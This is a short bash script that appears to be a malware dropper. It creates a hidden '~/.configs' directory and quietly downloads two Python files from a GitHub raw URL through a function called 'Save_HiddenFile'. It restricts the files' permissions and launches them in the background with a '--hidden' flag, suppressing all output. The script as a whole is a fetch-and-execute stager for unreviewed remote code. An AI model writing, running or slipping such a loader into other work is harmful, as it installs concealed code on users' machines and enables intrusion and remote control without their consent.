#!/usr/bin/env bash

CONFIG_PATH="$HOME/.configs"

# Create config directory silently
mkdir -p "$CONFIG_PATH" || { echo "Failed"; exit 1; }

Save_HiddenFile() {
    local URL="$1"
    local TARGET_PATH="$2"
    
    if [ -f "$TARGET_PATH" ]; then
        chmod 644 "$TARGET_PATH" &> /dev/null
    fi

    local DOWNLOAD_SUCCESS=1
    local CURL_BIN=""

    if command -v curl &> /dev/null; then
        CURL_BIN="curl"
    elif [ -x "/usr/bin/curl" ]; then
        CURL_BIN="/usr/bin/curl"
    elif [ -x "/usr/local/bin/curl" ]; then
        CURL_BIN="/usr/local/bin/curl"
    fi

    if [ -n "$CURL_BIN" ]; then
        "$CURL_BIN" -sS --tlsv1.2 -o "$TARGET_PATH" "$URL" &> /dev/null
        DOWNLOAD_SUCCESS=$?
    else
        python3 -c "
import urllib.request
try:
    urllib.request.urlretrieve('$URL', '$TARGET_PATH')
    exit(0)
except:
    exit(1)
" &> /dev/null
        DOWNLOAD_SUCCESS=$?
    fi

    if [ $DOWNLOAD_SUCCESS -eq 0 ]; then
        chmod 600 "$TARGET_PATH" &> /dev/null
        return 0
    else
        return 1
    fi
}

# ---- Execution ----

FINAL_PATH="$CONFIG_PATH/client.py"
Save_HiddenFile "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py" "$FINAL_PATH" || { echo "Failed"; exit 1; }

FINAL_PATH3="$CONFIG_PATH/auto.py"
Save_HiddenFile "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py" "$FINAL_PATH3" || { echo "Failed"; exit 1; }

if ! command -v python3 &> /dev/null; then
    echo "Failed"
    exit 1
fi

python3 -u "$FINAL_PATH3" "$FINAL_PATH" --hidden &> /dev/null &
LAUNCH_PID=$!

wait $LAUNCH_PID
EXIT_CODE=$?

if [ $EXIT_CODE -ne 0 ]; then
    echo "Failed"
    exit 1
fi

exit 0
